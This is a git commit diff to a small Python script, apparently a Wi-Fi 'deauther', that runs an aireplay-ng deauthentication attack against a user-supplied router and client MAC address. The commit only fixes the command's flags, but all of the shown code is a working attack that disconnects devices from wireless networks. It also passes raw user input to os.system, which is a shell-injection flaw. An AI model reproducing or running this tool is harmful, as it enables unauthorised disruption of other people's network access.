aa4e8b1ac4981752342151940df4ee9b99ae9bce
Hello world <58394579+tzgn@users.noreply.github.com>
2020-07-23 14:05:27 +0300

    Update p4d4w4n_deauther.py

--- p4d4w4n_deauther.py
+++ p4d4w4n_deauther.py
@@ -4,5 +4,5 @@ targetmac=input("target mac adress: ")
 interface=input("interface: ")
 attackpow=input("attack power: ")
 
-os.system(f"aireplay-ng -0 {attackpow} -a {routermac} -c {targetmac} -i {interface}")
+os.system(f"aireplay-ng -0 {attackpow} -a {routermac} -c {targetmac} {interface}")
 
